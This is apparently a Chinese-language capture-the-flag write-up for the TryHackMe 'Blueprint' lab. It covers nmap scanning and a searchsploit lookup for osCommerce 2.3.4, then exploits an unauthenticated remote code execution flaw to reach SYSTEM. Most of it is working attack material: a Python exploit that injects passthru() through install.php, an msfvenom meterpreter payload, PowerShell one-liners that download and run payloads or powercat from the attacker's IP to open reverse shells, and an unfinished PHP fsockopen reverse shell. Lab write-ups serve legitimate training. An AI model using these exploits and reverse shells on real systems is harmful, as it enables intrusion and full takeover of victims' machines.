# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/tryhackme/Blueprint]
└─# nmap -sV -Pn 10.10.251.204    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 03:34 EST
Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 69.23% done; ETC: 03:37 (0:00:29 remaining)
Nmap scan report for 10.10.251.204
Host is up (0.47s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.68 seconds

```

可以看到开了3个http服务，一个共享服务以及若干rpc服务

浏览器依次打开80和443端口服务，首页都报错。

8080服务显示有一个叫```oscommerce-2.3.4```的web app，版本是```2.3.4```

在kali搜索这个web app的漏洞情况：
```
┌──(root💀kali)-[~/tryhackme/Blueprint]
└─# searchsploit oscommerce 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                                                                               | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                                                                             | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                                                                          | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                                                                           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                                                                              | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                                                                                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                                                                                | php/webapps/44374.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

可以说满满都是漏洞，包括sql注入，文件上传，远程代码执行等。

我们把远程代码执行攻击脚本拷贝到本地，经过测试目标系统php禁用了```system```函数，但是```passthru```函数是可以使用的。

我们输入```whoami```

回显为：```nt authority\system ```

nice,直接最高权限。


```
import requests

base_url = "http://10.10.251.204:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.251.204:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

payload = '\');'
payload += 'passthru("ping 10.13.21.169");'    # 
payload += '/*'

data['DB_DATABASE'] = payload

r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
```




msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4242 -f exe > reverse.exe


powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/reverse.exe','C:\temp\reverse.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/','C:\temp\reverse.exe')"


powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.21.169:8000/powercat.ps1');powercat -c 10.13.21.169 -p 4242 -e cmd"


powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')


php -r '$sock=fsockopen("10.13.21.169",4242);passthru("cmd.exe");